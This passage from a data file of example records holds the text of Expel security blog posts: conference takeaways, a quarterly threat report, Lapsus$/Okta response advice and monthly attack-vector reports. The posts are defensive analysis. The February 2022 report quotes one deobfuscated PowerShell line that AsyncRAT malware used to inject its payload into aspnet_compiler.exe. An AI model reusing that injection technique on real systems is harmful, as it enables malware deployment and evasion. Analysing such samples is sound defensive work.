their security teams to investigate and respond to those threats. Putting it into practice Weve already seen success with our customers in helping them better understand whats happening with their data in some of these cloud applications. Weve been able to create detections that are specific to their applications (and even their users)  all of which give us and our customers better signals that help us understand quickly and accurately if theres a security risk. So  if youre looking for a place to start your cloud application security journey, these three straightforward tips are a good jumping off point. And if you need help or have questions, well be here  drop us a note.'}) (input_keys={'title'}),
  Example({'title': 'Top 3 takeaways from RSA Conference 2022', 'url': 'https://expel.com/blog/top-3-takeaways-from-rsa-conference-2022/', 'date': 'Jun 16, 2022', 'contents': 'Subscribe  EXPEL BLOG Top 3 takeaways from RSA Conference 2022 Expel insider  3 MIN READ  KELLY FIEDLER  JUN 16, 2022  TAGS: Cloud security / Company news / MDR / Tech tools Thats a wrap on RSA Conference 2022, and were still dazed from the four days we spent on the show floor. For many of us, it was the first major in-person conference since the onset of the pandemic, and our time back at Moscone was both exciting and familiar. The Expel booth buzzed with friends old and new as we made our exhibitor debut. To kick things off, we popped champagne and heard from our founders about how Expel came to be. Then, through demos and conversations, we got to share our approach to security and show you why we think it can even be delightful. Harry Mack brought down the house with a series of improvisational freestyle rap performances that had folks dancing in the aisle. We attended sessions and made connections with industry colleagues from around the world. And our friendly bots, Josie and Ruxie, even made an appearance ! Now that weve had time to reflect on this years conference, here are three of the big takeaways and highlights from our time at Moscone. Hope and encouragement won over fear, uncertainty, and doubt. In an industry that often relies on FUD (fear, uncertainty, and doubt) to compel action, the common thread from the keynote speakers was a message of hope. Notable leaders from industry giants (think: RSA, Cisco, and VMware) took to the stage to remind us that if we pull together, we have the power to change the world for the better. Speakers took lessons learned from recent history to lay out trends theyre seeing across their customer bases, and we all left sessions feeling encouraged. Cybersecurity is for everyone. The only way to stay ahead in a constantly evolving threat landscape is through an approach to security thats also constantly evolving. What does that look like? Technological innovation, human ingenuity and expertise, and inclusivity in our defender community. Vasu Jakkal, Corporate Vice President for Microsoft Security, Compliance, Identity Management and Privacy, argued that the best way to overcome this challenge is to create a more inclusive environment where people from many different backgrounds are empowered to do their best work and thrive. We echo this sentiment wholeheartedly at Expel, and stand by the belief that were better when different. We know were stronger when we recognize, celebrate, and learn from those whose backgrounds and perspectives are different from our own. (More on Jakkals ideas for breaking down barriers in cybersecurity, and how we practice equity, diversity, and inclusion on a day-to-day basis at Expel in our day two RSA recap .) In a time of economic change, ROI is more important than ever. While this years conference was a taste of normalcy, we cant ignore that the current economic situation has and will have an effect on the industryfor customers and vendors alike. With so many companies vying for their share of the market, the security providers that will ultimately stand out are the ones that can demonstrate value and deliver a positive return on investment (ROI). Companies that put an emphasis on enhanced reportinghelping customers understand and translate their investments to decision makerswill stand above the competition. The overwhelming sentiment from the week was how happy security folks were to be back in person with this close-knit community. Our cheeks are still aching from all the smiling, as we reconnected with colleagues and even met some in-person for the first time. It can sometimes be easy to forget, but theres a human element that sits at the core of the security industry. Its conferences like thiswhere were able to swap stories, trade lessons learned, and share a laughthat remind us why we do what we do. The jet lag is finally wearing off and were already getting excited to gear up for next year! ICYMI, we spent the week leading up to RSA sharing news about recent momentum , product advancements , and even a new partnership with Armis and we cant wait to keep the good news coming. If youre curious about what makes Expel, Expel wed love to chat anytime .'}) (input_keys={'title'}),
  Example({'title': 'Top 5 takeaways: Expel Quarterly Threat Report Q2', 'url': 'https://expel.com/blog/top-5-takeaways-expel-quarterly-threat-report-q2-2022/', 'date': 'Aug 9, 2022', 'contents': 'Subscribe  EXPEL BLOG Top 5 takeaways: Expel Quarterly Threat Report Q2 Security operations  3 MIN READ  JONATHAN HENCINSKI  AUG 9, 2022  TAGS: Cloud security / MDR / Tech tools Just like that, a new quarter is upon us and were back with our second Expel Quarterly Threat Report. The series, which debuted in the first quarter (Q1) of 2022, provides cybersecurity data, trends, and recommendations to help you protect your organization. The second quarter (Q2) edition dives into the trends our security operations center (SOC) identified through investigations into alerts, email submissions, and threat hunting leads from April 1 to June 30, 2022. Weve identified some insights and patterns to help guide strategic decision-making and operational processes for your team using a combination of time-series analysis, statistics, customer input, and analyst instinct. Our goal? By sharing how attackers got in, and how we stopped them, we hope to translate the events we detect into security strategy for your organization. Here are our top five takeaways. TL;DR: Microsoft blocking macros by default is changing the game for threat actors and defenders alike; legacy MFA in cloud apps and cloud identity providers simply isnt cutting it; and business email compromise (BEC) will continue to reign supreme in Q3. 1: Hackers are shifting their pre-ransomware approach, thanks in part to Microsoft In Q1, our report noted that macro-enabled Microsoft Word documents (VBA macro) and Excel 4.0 macros were the initial attack vectors in 55% of all pre-ransomware incidents. But in Q2, Excel 4.0 macro attacks fell to 9% and VBA macro initial attacks dropped to zero. What changed? Microsoft began blocking macros by default in Office applications, so threat actors all but abandoned the use of VBA and Excel 4.0 macros for initial entry. Instead, they opted to use ISO, LNK, and ZIP files that store other files for initial access. In fact, the use of ISO files for initial access increased 15% compared to Q1. Were advising our customers to block ISO files at email and web gateways. But proceed with caution: many businesses use these files in the regular course of business. Also, consider unregistering ISO file extensions in Microsoft Windows Explorer. By doing so, ISO files will no longer be recognized by Windows and double-clicking wont result in program execution. 2: Identity-based attacks are still the elephant in the room and they arent going away Allie Mellen, independent senior analyst, recently tweeted,  Identity is the new endpoint , and we tend to agree. Identity-based attacks (credential theft, credential abuse, long-term access key theft) accounted for 56% of all incidents handled by our SOC in Q2. Business email compromise (BEC) remains public enemy number one, accounting for 45% of all incidentswith 100% occuring in Microsoft Office 365 (O365). For context here, we monitor roughly twice as many O365 tenants as we do Google Workspace, but the fact that we didnt identify any BEC attempts in Google Workspace is pretty interesting. Whats more, 19% of BEC attempts bypassed MFA in O365 using legacy protocols (up 16 percentage points from Q1). The takeaway? Single-factor authentication backed by conditional access policies arent enough to prevent unauthorized access. BEC (unauthorized access into email apps) and business application compromise (BAC, unauthorized access into application data) made up 51% of all incidents, while identity-based attacks in popular cloud environments like AWS accounted for 5%. Unfortunately, we expect threat actors will continue to favor identity-based attacks in Q3. 3: The majority of our leads come from a cloud application or identity provider integration An effective detection and response strategy is more than EDRits identity-oriented. Fifty-four percent of all identified Q2 incidents began with an initial lead from a cloud application or identity provider integration; 38% started with an initial lead from an EDR integration. While network (NDR) and SIEM make up only 7% of initial leads into Q2 incidents, these technologies provide SOC analysts with significant investigative capabilities and power orchestration in the Expel Workbench. 4: Automation frees up human analysts to do what they do best To improve SOC scale and quality, we automate a lot of our analysts repetitive tasksthings like grab the Windows event log or lets take a look at 30 days of authentication activity for a given user. This frees analysts up to focus on risk-based decisions for our customers vs. spending time fighting with a query language to retrieve results. How much of a burden does orchestrated automation take off analysts? Automation, not humans, completed key investigative actions 77% of the time we sent an alert to our SOC for review. When analysts spend less time buried in manual tasks, it boosts scale and levels up quality by standardizing investigative steps. 5: Orchestration dramatically improves remediation time Orchestration not only improves scale and quality in our SOC, but also accelerates remediation. When our SOC identifies an incident, analysts investigate to uncover the scope and create remediation actions to reduce risk. Workbench automatically executes remediation actions for our customers, such as containing a host, disabling an account, removing phishing emails, or adding attacker indicators of compromise (IOCs)/hashes to a deny list. In Q2, the median time to complete a remediation action not automated through orchestration was two hours. What happens when a remediation action is automated via orchestration? That median time drops to seven minutesa 1640% improvement. We know what youre thinkingwith so many great takeaways in this blog, what more could the full report have in store? See for yourself.'}) (input_keys={'title'}),
  Example({'title': 'Top 7 recs for responding to the Lapsus$ breach claims', 'url': 'https://expel.com/blog/top-7-recs-for-responding-to-the-lapsus-breach-claims/', 'date': 'Mar 23, 2022', 'contents': 'Subscribe  EXPEL BLOG Top 7 recs for responding to the Lapsus$ breach claims Security operations  2 MIN READ  JONATHAN HENCINSKI  MAR 23, 2022  TAGS: MDR By now, youve likely heard about the situation that unfolded yesterday around Okta and the Lapsus$ breach claims. As of today, March 23, 2022, Oktas investigation is ongoing . While the new information and more limited scope may reduce the risk to organizations, Oktas investigation continues and the situation remains fluid. This post will walk you through our recommendations for immediate and strategic steps you can take to protect yourself and your org. Here are our top 7 recommendations: Rotate privileged Okta passwords and Okta API tokens. Unless a business need exists, we strongly recommend disabling of the following Okta configurations: Give Access to Okta Support Give Directory Debugger Access to Okta Support Review Okta logs looking at admin authentications and activity for the past four months (January 1 through March 22, 2022 is a good time frame). During this same chunk of time, check out any Okta admin activity to ensure it aligns with expected activities and sources. Specifically, review these events: eventType eq user.mfa.factor.deactivate eventType eq user.account.update_password For these types of events, youll need to review entries generated by non-admin users or events marked as Okta System. If an Okta account was found to have had MFA disabled during the January through March 22 timeframe, ask these two questions: Who was the user? What was the root cause of the disablement? Once you answer those, re-enable MFA for those accounts. From there, enable MFA on initial Okta login and on all individual applications. Consider how your organization might replace legacy MFA solutions (SMS text and digital tokens) with a FIDO compliant solution. Based on your organizations geographical presence, consider configuring Okta network zones to deny authentication from countries your organization would consider atypical. Take some time to plan. Establish terms and conditions for incident response services before a security incident by executing an Incident Response (IR) retainer. This proactive approach can significantly reduce response time and impact. Use this as an opportunity to test your incident response plan (IRP). Dont have an IRP? Its time to make one. Then test it, and test it again. Communicate transparently about what youre doing and what youve done to your internal and external stakeholders. The clearer you are up front, the less confusion arises as you deal with quick changes that might have a wide effect within your org. When communicating during a fluid situation, its important to set expectations and prepare stakeholders for change. In your communications, be clear on what decisions youve made, what you know, what you dont know, and when youll be in touch next. Like many of you, were watching the situation closely. If you have any questions about our recommendations, chat us anytime .'}) (input_keys={'title'}),
  Example({'title': 'Top Attack Vectors: August 2021', 'url': 'https://expel.com/blog/top-attack-vectors-august-2021/', 'date': None, 'contents': 'Subscribe  EXPEL BLOG Top Attack Vectors: August 2021 Security operations  5 MIN READ  TYLER FORNES AND BRITTON MANAHAN  SEP 16, 2021  TAGS: MDR Were often asked about the biggest threats we see across the incidents we investigate for our customers. Where should security teams focus their efforts and budgets? To answer these questions, were sharing monthly reports on the top attack vectors, trends, and resilience recommendations identified by our Security Operations Center (SOC). Our goal is to translate the security events were detecting into security strategy for your org. For this report, our SOC analyzed the incidents we investigated in August 2021 to determine the top attack vectors used by bad actors. A sneak peek at whats ahead: What to do about business email compromise (BEC) The rise in exploited public-facing vulnerabilities and our #1 resilience recommendation How credential-stealing malware is targeting crypto wallets Business email compromise (BEC) TL;DR: BEC continues to top the charts. Azure AD Identity Protection helps. Its no surprise to us that in August 2021, 63 percent of incidents our SOC handled were the result of a business email compromise. BEC continues to be the number one attack vector across our customers. However, BEC is different from a standard phishing attack. What were looking for in these cases is an attacker abusing a stolen credential (previously phished from a user) and using it to access that users inbox  giving them access to sensitive information. Chaos ensues, and weve witnessed everything from mass mail spam to fraudulent wire transfers happen next. Wondering how to get better at identifying BEC? In August, 61 percent of all BEC we responded to was identified by Azure AD Identity Protection. This is no surprise  last month, we noted that 53 percent of BEC incidents we identified were targeted against Microsoft O365. We can safely assume that Microsoft accounts will remain a prime target for attackers heading into the later months of 2021. But if youre an org struggling with BEC and looking for a solution, Azure AD Identity Protection can provide help. What do we like about it? Its ability to identify anomalous logins based on tracking a users login behavior. Azure AD Identity Protection generates profiles based on this information, then provides dynamic alerting that can be adjusted based on a users travel and location history. When a user logs in from two improbable places at once (i.e. the U.S and West Africa), you get an alert. We refer to this as Geo infeasibility at Expel, and its the number one way we catch bad actors in inboxes. That being said, a single product wont solve all your woes here. But the stats speak for themselves. Azure AD Identity Protection is a powerful tool for catching BEC. Wed bet our paychecks that BEC will continue to top the charts of attack vectors for the rest of 2021 and into 2022. If you havent reviewed your defenses recently, heres your monthly reminder to enable multi-factor authentication (MFA) and disable IMAP and POP3. Resilience recommendations: You know were going to say it, but MFA everything and everywhere. Conditional access policies are a great way to help mitigate Geo infeasibility. Disable legacy protocols like IMAP and POP3 (these dont enforce MFA). Consider Azure AD Identity Protection to help identify suspicious mailbox logins. Public-Facing Vulnerabilities TL;DR: Opportunistic attackers are taking advantage of vulnerable web applications more than ever. Incidents involving the exploitation of public-facing web applications rose 400 percent from July 2021. Overall, 55 percent of our critical incidents in August 2021 were found to be the result of an exploited application running on a public-facing web server. Why? Were finding that most of these attacks are opportunistic, looking to deploy ransomware, coin miners and webshells. In most cases, the scripted delivery of these exploits is the result of internet-wide scanning and allows an opportunistic attacker to broaden their attack surface and proliferate their payload of choice in as many orgs as possible. Once exploited, we notice the early signs of these attacks through detections that monitor a web-working process (such as IIS or Apache) spawning a command shell (cmd/bash/PowerShell). In these relationships, were looking for a command shell thats downloading a second stage payload or performing unusual reconnaissance actions that may indicate the presence of a webshell. Below is a summary of the top web application vulnerabilities weve seen exploited across our customer base. One key takeaway: more than half of the vulnerabilities weve seen exploited are over two years old. CVE-2019-2725 Oracle WebLogic Server CVE-2019-18935 Telerik UI for ASP.NET AJAX CVE-2018-7669 Sitecore CMS CVE-2017-10271 Oracle WebLogic Server CVE-2021-26084 Confluence Server From our security team to yours  identifying and patching border-facing assets should be number one on your to-do list. If you arent sure where to start, a few quick queries on Shodan can save you a lot of heartbreak by helping to understand what applications are exposed (and potentially vulnerable) at the border of your network. Heres a simple one to get you started: net:1.2.3.4/24 (where 1.2.3.4 is your network range in CIDR notation) Resilience recommendations: Deploy an Endpoint Defense and Response (EDR) tool on web servers. Scan and identify public-facing assets using Shodan . Ensure public web applications are patched to their latest version. Deploy a Web Application Firewall (WAF). Credential Stealers TL;DR: Attackers are hungrier than ever for crypto. Keep your wallets safe! Commodity malware is riddled with credential stealers, and we see a lot of them. In fact, we noticed that 15 percent of incidents we identified in August included the deployment of credential stealing malware by an attacker  a 114 percent increase from July 2021. We noticed several samples of the REDLINE malware being deployed throughout our customer base. In all cases, REDLINE was delivered through a zipped executable to the user, likely through a phishing email. These campaigns rely on the double click and let it rip principle, where user interaction is required to kick off the infection. We talked at length about this in Julys report , and firmly expect the trend of threat actors favoring user execution to continue. We dug through several samples of REDLINE during August 2021 and had a few surprising findings. First, whats old is new again  all samples of REDLINE that we analyzed used the Nullsoft Scriptable Install System to kick off the malware installation. A blast from the past, but a solid way of presenting a familiar and user-friendly interface for installing software. Second, as August progressed and we observed additional REDLINE samples, we noticed that the malware started to heavily target cryptocurrency wallets resident on the infected machines. It became obvious that as trends in cryptocurrency favored certain coins, REDLINE developers were quick to add wallets of high value. This is a good reminder that credential stealers are highly configurable and also often target stored credentials in browsers, financial services and other legitimate software. As 2021 beats on, its more important than ever to talk to your users about trusted software and identifying suspicious applications. Nine times out of ten, if someone emails you a zip file and asks you to install a piece of software, its likely bad. Resilience recommendations: We know its a tall order, but spend some time educating your users about trusted software and identifying suspicious applications. Consider implementing an application safelisting tool (like Windows Defender Application Control) to help defend against malicious software installation. Consider implementing/tuning your email gateway to inspect zipped attachments that include executables, or encrypted zip files. Takeaways August continued to prove that BEC isnt going away anytime soon. You know our top recommendation  MFA, MFA, MFA. But also take a look at how Azure AD Identity Protection may be able to help your org clamp down on BEC attempts through Geo infeasibility notifications. Also check out our phishing recommendations in last months report to keep bad actors from accessing credentials in the first place. Next: exploitation of vulnerabilities in public-facing web apps is on the rise. Number one on the to-do list is to identify and patch border-facing assets  Shodan is a great tool to help identify exposure. Then consider taking some of the additional resilience actions weve discussed, like deploying an EDR tool and a Web Application Firewall (WAF). Lastly, user execution will remain bad actors preferred method of infection. So ramp up user education on trusted software and identifying suspicious applications to keep malicious zipped attachments from impacting your org. Also watch out for users crypto wallets as malware adapts to target new trends in cryptocurrency. Well be back with insights on Septembers top attack vectors. Have questions about this months data or what it means for your org? Drop us a note .'}) (input_keys={'title'}),
  Example({'title': 'Top Attack Vectors: December 2021', 'url': 'https://expel.com/blog/top-attack-vectors-december-2021/', 'date': 'Jan 13, 2022', 'contents': 'Subscribe  EXPEL BLOG Top Attack Vectors: December 2021 Security operations  7 MIN READ  BRITTON MANAHAN  JAN 13, 2022  TAGS: MDR Were often asked about the biggest threats we see across the incidents we investigate for our customers. Where should security teams focus their efforts and budgets? To answer these questions, were sharing monthly reports on the top attack vectors, trends, and resilience recommendations identified by our security operations center (SOC). Our goal is to translate the security events were detecting into a security strategy for your org. For this report, our SOC analyzed the incidents we investigated in December 2021 to determine the top attack vectors used by threat actors. In a month with cybersecurity news about the Log4j vulnerability making top headlines, heres what stood out: Threat actors performing large-scale scans to exploit systems using the Log4j zero-day vulnerability Attackers continuing to use the Cobalt Strike command and control toolkit as malware Threat actors using a new attack pattern to deploy ransomware Attackers authenticating into an isolated Citrix remote access session, then breaking out of it Read on to learn more and see our tips for what to do about all of the above. Log4j vulnerability was a top target TL;DR: The recently-discovered Log4j vulnerability was a major target in December as attackers tried to outrun remediation by scanning the web for unpatched instances to exploit. This probably isnt your first time hearing about the Apache Log4j zero-day vulnerability discovered in early December 2021. Its now considered one of the most impactful vulnerabilities uncovered in recent years. In a nutshell, this vulnerability allows for arbitrary remote code execution by exploiting a flaw in JNDI lookups performed by the Log4j Java logging library. This vulnerability is so devastating because of the number of software applications and libraries that rely on Log4j, putting hundreds of millions of devices at risk . Weve received a steady stream of alerts related to the widespread scanning activity threat actors are conducting to locate vulnerable systems. And since this commonly-used logging library provides such a large attack surface, its no surprise that attackers are finding success. In fact, 100 percent of incidents involving public-facing exploits that we investigated in December were a result of the Log4j zero-day vulnerability. Out of the successful Log4j exploits we observed, 50 percent established a remote shell on the exploited system while the other half deployed malware like Cobalt Strike. The incidents involving remote shells may have been first steps towards deploying malware, but were detected and the systems contained before attackers had the chance. When we have evidence that malwares running on a system, our priorities are to stop it, then figure out how it got there. In December, many of our initial leads were broad internet scanning activity that we then had to investigate further to determine whether any successful Log4j exploitation actually occurred. And proving something malicious didnt happen is definitely the more time-consuming task. So we spent a lot of time examining network activity on the targeted hosts for potential successful callbacks to attacker-controlled endpoints. Due to the up-stream nature of the Log4j library (meaning its use by third-party apps and libraries), it can be difficult for orgs to know which of their systems may be running Log4j and are vulnerable to an exploit. As a result, this vulnerability will likely remain relevant for some time, even though patches have been released. Resilience recommendations: Determine if youre logging applications to other managed logging platforms (local or cloud-hosted). Validate whether these apps are vulnerable and/or impacted by this zero-day vulnerability. Use a vulnerability scan to confirm your findings and attack surface for this vulnerability. Anyone using Log4j should update to version 2.17.1 ASAP. The latest version is already on the Log4j download page . The patched version of Log4j 2.17.1 requires a minimum of Java 8. If youre on Java 7, youll need to upgrade to Java 8. If updating to the latest version isnt possible, you can also mitigate exploit attempts by removing the JndiLookup class from the classpath. Cobalt Strike TL;DR: Cobalt Strike was the most common malware family we observed in December and continues to be a favorite of threat actors. In December 2021, 20 percent of the incident payloads we identified were variants of the Cobalt Strike penetration testing command and control (C2) framework. While originally designed as a paid tool for legitimate engagements, Cobalt Strikes module nature and capabilities have made it a favorite tool of threat actors. Its also motivated them to crack versions and release them on the secret web. The Cobalt Strike Beacon payload can be generated in many forms, including a stand-alone exe, but its most often reflectively loaded into memory by an initial stage payload as a file-less loaded DLL. The functionality provided by this framework includes (but isnt limited to) command and script execution, covert encryption communication over different network protocols, file uploads and downloads, reconnaissance, privilege escalation, and lateral movement. Threat actors used several delivery methods and first stage payloads in December to ultimately try to establish a C2 connection through a Cobalt Strike Beacon. The initial infection vectors for these incidents included: Phishing Public-facing exploitation of Log4j Drive-by download Using those infection vectors, attackers delivered these first stage payloads to then try to load different variants of a Cobalt Strike Beacon: BazarLoader Gootkit Generic Obfuscated PowerShell Clearly, threat actors are using a variety of infection vectors to deploy an initial malware stage embedded with or configured to download a Cobalt Strike Beacon payload. Attackers have a wide range of choices for this initial stage, using Windows executables or scripting languages across different malware variants. But they typically avoid having the Beacon payload touch persistent storage when loading it into memory (file-less malware). Resilience recommendations: Confirm your endpoint detection and response (EDR) coverage across all of your endpoints. Perform a vulnerability scan against your externally facing systems. Consideration conducting internal or external penetration testing using a legitimate version of the Cobalt Strike framework . Implement network layer controls capable of detecting or blocking traffic to low reputation destinations. Conduct regular security awareness training for your employees with a focus on phishing. Other incidents of note TL;DR: Two particularly interesting incidents stood out in December  one where threat actors were likely preparing to deploy ransomware and another where they broke out of a remote access Citrix session. One incident of note that we observed in December highlights a recent pattern across attack lifecycle stages used to ultimately deploy ransomware across an environment. The incident began with a phishing email used to deploy the initial BazarLoader malware payload, which communicated out over a URL that tried to appear related to Zoom  our first indicator of malicious activity. The indicators of compromise (IOCs) from this incident directly correlated to an ongoing campaign where attackers use BazarLoader to download and load a Cobalt Strike Beacon into memory to start internal reconnaissance on the network and establish a valid method of lateral movement. Threat actors then typically begin widespread deployment of the Diavol family of ransomware. However, we detected this activity early in its lifecycle and contained the system that the attackers were using as an entry point before they could deploy ransomware. A second notable incident we detected and responded to in December involved a server running the Citrix remote access application. After obtaining credentials provided to a third-party vendor, the threat actors were able to authenticate into a Citrix remote access session running on the server. The most interesting part of this incident happened next  the attackers were able to break out of this isolated session with a method using Internet Explorer . We determined this through the process tree, which showed Internet Explorer as the parent process for several command prompt, PowerShell, and system reconnaissance-related processes. After breaking out of the isolated Citrix session, the attacker acquired credentials and used Remote Desktop Protocol (RDP) to move laterally in the environment and access several additional systems. However, they were detected and expelled from the environment before they had time to exfiltrate any sensitive data or perform any other harmful activities. Resilience recommendations Regularly perform an external penetration test to make sure your environment is prepared to detect advanced tactics and techniques. Review your companys incident response process and procedures to make sure you can confirm true positives and respond promptly to incidents in progress to minimize the impact a threat actor can have. Confirm your endpoint detection and response (EDR) coverage to maximize your visibility and ability to respond in your environment. Takeaways Phishing remained the most common attack vector in December ( check out our top resilience recs !), but we also observed a bunch of novel trends and incidents. The recently-discovered Log4j zero-day vulnerability is historic because of its frequent use as an error logging library in a variety of Java-based apps. Threat actors wasted no time starting to mass scan the Internet for vulnerable systems and try exploits to establish remote shells or deploy malware. While activity related to this vulnerability has come down from its peak in December, Log4j will stay relevant for some time because of its widespread (and sometimes difficult to identify) impact. If you havent already, its critical to understand which of your systems are running Log4j and make sure theyre updated to version 2.17.1. The most common malware payload we observed in December was the Cobalt Strike Beacon. Attackers are more and more drawn to cracked versions of this penetration testing software released on the secret web because of the number of built-in features it provides and its high level of stability. To avoid detection, this command and control framework is most commonly reflectively loaded into memory by the initial payload delivered to the host, without touching persistent storage. To help defend against malicious Cobalt Strike, focus on initial infection vectors by conducting regular security training for your employees and performing vulnerability scans of your externally-facing systems. We also highlighted two interesting incidents that we responded to in December. One of these involved a recent threat actor campaign following an established formula for typical network intrusion. This flow uses a phishing email as the initial entry point to deliver a first stage payload. The first stage malware then brings down additional functionality to perform internal reconnaissance, privilege escalation, and lateral movement. Once the attacker is satisfied with the level of access theyve gained in the environment, theyll deploy a ransomware variant. But in this particular incident, the threat actor was detected and stopped before they could release ransomware into the environment. Another notable incident in December involved a Citrix remote session authenticated through compromised third-party credentials. The attacker was able to break out of this isolated Citrix session with one of several methods that use Internet Explorer. Once the threat actor broke out and had access to the underlying server, they were able to gather credentials to start moving laterally before they were expelled from the environment. Consider having an external third party perform a penetration test in your environment to evaluate your security controls against sophisticated attacker techniques. Well be back with insights on Januarys top attack vectors. In the meantime, have questions about this months data or what it means for your org? Drop us a note .'}) (input_keys={'title'}),
  Example({'title': 'Top Attack Vectors: February 2022', 'url': 'https://expel.com/blog/top-attack-vectors-february-2022/', 'date': 'Mar 17, 2022', 'contents': 'Subscribe  EXPEL BLOG Top Attack Vectors: February 2022 Security operations  8 MIN READ  BRITTON MANAHAN, SIMON WONG AND HIRANYA MIR  MAR 17, 2022  TAGS: MDR Were often asked about the biggest threats we see across the incidents we investigate for our customers. Where should security teams focus their efforts and budgets? To answer these questions, were sharing monthly reports on the top attack vectors, trends, and resilience recommendations identified by our security operations center (SOC). Our goal is to translate the security events were detecting into a security strategy for your org. For this report, our SOC analyzed the incidents we investigated in February 2022 to determine the top attack vectors used by threat actors. Heres what stood out this month: Attackers using tried and true tactics  including Log4j  to infiltrate systems and deploy coin miners Threat actors deploying the AsyncRAT remote administration tool through an ISO file Phishing tactics targeting credentials through Adobe and cryptocurrency Keep reading for details and our tips on what to do about all the above. The usual suspects TL;DR: Its important to keep an eye on known threats even as new ones emerge. We observed attackers using multiple threat vectors and tactics this month that weve highlighted in previous reports. In February 2022, we observed a more even distribution of non-phishing threat vectors, with the usual suspects from previous reports making a reappearance. This includes removable media ranking as the initial vector for five percent of Februarys incidents, indicating it remains a relevant threat after our discussion in last months report . The second-most frequent attack vector in February was the use of valid credentials. In two of the incidents involving valid credentials, we saw attackers authenticate into cloud-based single sign-on (SSO) identity providers. We detected and stopped this activity before attackers could progress based on logins from abnormal countries and the identity provider reporting suspicious activity for the account. We previously covered the opportunities available to threat actors who gain access to SSO accounts in our September 2021 report. Phishing emails containing links to credential harvesters and other types of credential exposure or reuse increase the risk of threat actors gaining access to any business apps provisioned by the SSO provider. Its not uncommon for credential harvester pages to mimic popular SSO cloud identity providers like Okta . While down significantly from previous months, we also observed one public-facing exploit used to deploy a crypto miner in February. In this incident, the attacker took advantage of the Log4j vulnerability, which we detected based on indicators of compromise (IOCs) matching a current threat actor campaign . In our December 2021 report, we spoke about how the downstream nature and prevalence of this Java logging library will keep this vulnerability relevant for some time. Another trend called out in our October 2021 report was cybercriminals targeting cryptocurrency by highjacking computing resources to mine for rewards  also known as cryptojacking. In the previously mentioned Log4j incident, we saw the threat actor use their unauthorized access to deploy the XMrig crypto mining software. Despite the current dip in the cryptocurrency market, threat actors are clearly still interested in acquiring cryptocurrency as 15 percent of payloads deployed in critical incidents we investigated in February were crypto mining software. Resilience recommendations: Make sure your security awareness training includes sections on the dangers of external USB storage devices. Implement phish-resistant MFA everywhere (FIDO/WebAuthn). Enforce MFA prompts when users connect to sensitive apps through app-level MFA. Conduct a vulnerability scan to understand your attack surface and detect any vulnerabilities present on public-facing systems. If youre using Log4j, you should update to version 2.17.1 ASAP if you havent already. The latest version is on the Log4j download page . The patched version of Log4j 2.17.1 requires a minimum of Java 8. If youre on Java 7, youll need to upgrade to Java 8. If updating to the latest version isnt possible, you can also mitigate exploit attempts by removing the JndiLookup class from the classpath. AsyncRAT TL;DR: We observed AsyncRAT malware used as a payload in several incidents this month. The AsyncRAT malware variant made up 15 percent of all identified malware payloads for incidents we responded to in February 2022. AsyncRAT is an open-source remote administration tool (RAT) written in C# and available on GitHub. Its functionality includes all the standard RAT abilities, including file uploading, downloading, and command execution. The incidents we encountered deployed AsyncRAT using an initial ISO file, which was mounted on the local computer system as a drive containing a VBScript file. When executed, this initial VBScript file launches a PowerShell script thats responsible for decompressing two DotNet modules. One of these DotNet modules is loaded into memory by the PowerShell script while the raw bytes for the second module are passed as a parameter to the initial module. The initial DotNet module loaded into memory by the PowerShell script then injects the second DotNet module (the AsyncRAT payload) into a process supplied as a parameter. In both incidents, aspnet_compiler.exe, the compilation tool for ASP.NET website projects, was the target process for this final AsyncRAT payload. The deobfuscated command from the PowerShell script used to achieve this AsyncRAT injection was: [Reflection.Assembly]::Load($InjectionModule).GetType(NV.b).$get1(Execute).Invoke($null,(C:WindowsMicrosoft.NEtFrameworkv4.0.30319aspnet_compiler.exe,$ASyncRAT)) $InjectionModule is the DotNet Module that performs the process injection based on the target program ( aspnet_compiler.exe in this example) and $AsyncRAT holds the raw bytes for the AsyncRAT remote access payload that will be injected into the remote process. Additionally, our analysis found that the DotNet modules from one of these incidents added a level of obfuscation by using the ConfuserEx DotNet module obfuscator to avoid detection of the fileless DotNet module components. These components are considered fileless because their unobfuscated and decompressed versions are never written to persistent storage, but are loaded into the live run-time memory of the local computer system. Resilience recommendations: Confirm your endpoint detection and response (EDR) coverage across all of your endpoints. Configure Windows Script Host (WSH) files to open in Notepad. By associating these file extensions with Notepad, you mitigate a primary entry point. Implement layered security controls across your environment to detect and prevent evolving threats. Perform a penetration test against your environment to evaluate any gaps in your security. Subscribe to open source intelligence (OSINT) feeds to stay up-to-date on malware trends and use this intelligence in your deployed security tech. Phishing TL;DR: We saw an increase in credential harvesters using Adobe services and cryptocurrency scam emails in February 2022. As usual, phishing was the biggest attack vector used by threat actors in February, involved in 57 percent of the incidents we investigated. We reviewed over 5,000 potentially malicious email submissions and identified two key phishing trends using the following techniques: Credential harvesters using Adobe services We noticed an increase in the number of emails using legitimate Adobe domains. Attackers are taking advantage of the ability to register an adobe.com subdomain through Adobe Campaign to give their emails a sense of legitimacy. Emails from this trend typically contain requests to collaborate on new projects, aiming to deceive recipients into believing the emails are legitimately work-related. Phishing invitation to view a fake business proposal using Adobe services Recipients are instructed to follow links that redirect them to what seems to be an Adobe webpage, but actually prompts them to download a file containing malicious code or click another link to navigate to a fake sign-in page. If the victim then enters their credentials, threat actors capture them and can begin a business email compromise attempt. Fake credential harvesting login page posing as a Microsoft page (note the suspicious URL) Cryptocurrency scams Since the surge in popularity of cryptocurrency, weve observed an influx of new phishing tactics as threat actors try to take advantage of the anonymity of cryptocurrency transactions to keep themselves from being traced. Since the start of the invasion of Ukraine, threat actors have specifically begun to impersonate legitimate aid organizations to exploit peoples desire to support refugees and victims with donations. Phishing email soliciting cryptocurrency donations (note that the senders email address doesnt align with the name, organization, or email provided in the email signature) Here are a few phrases weve seen in phishing emails referencing Ukraine to target cryptocurrency: Email subject: Help  Bitcoin Payment from your account Help save children in ukraine Crypto  Account Ukraine Donations Email body: Here is my BTC wallet transfer bitcoins This is my bitcoin id Now accepting cryptocurrency donation below is our wallet ID Given threat actors horrible appropriation of this conflict for malicious means and personal gain, those looking to provide financial support to victims of the invasion of Ukraine should confirm the legitimacy of any donation-related communications before providing financial information. For example, recipients should inspect the senders email address, search the organization online to confirm key contact details, and hover over any buttons/URLs in the email to inspect the redirect path without clicking it. Phishing resilience recommendations: Conduct regular security awareness training for employees, including phishing simulations. Dont click any links in a suspicious email. Double check the senders address and return path in suspicious emails. Use open source tools to verify details for external senders and organizations. Use a verified internal channel (for example, an email to a verified third-party vendor or a message on your companys internal messaging platform) to confirm if the communication/request in a suspicious email is legitimate and expected. Block access to malicious websites. Remove the email from a users inbox if its determined to be a phishing attempt. Takeaways In February 2022, we observed several threat vectors and tactics discussed in our previous reports making a strong 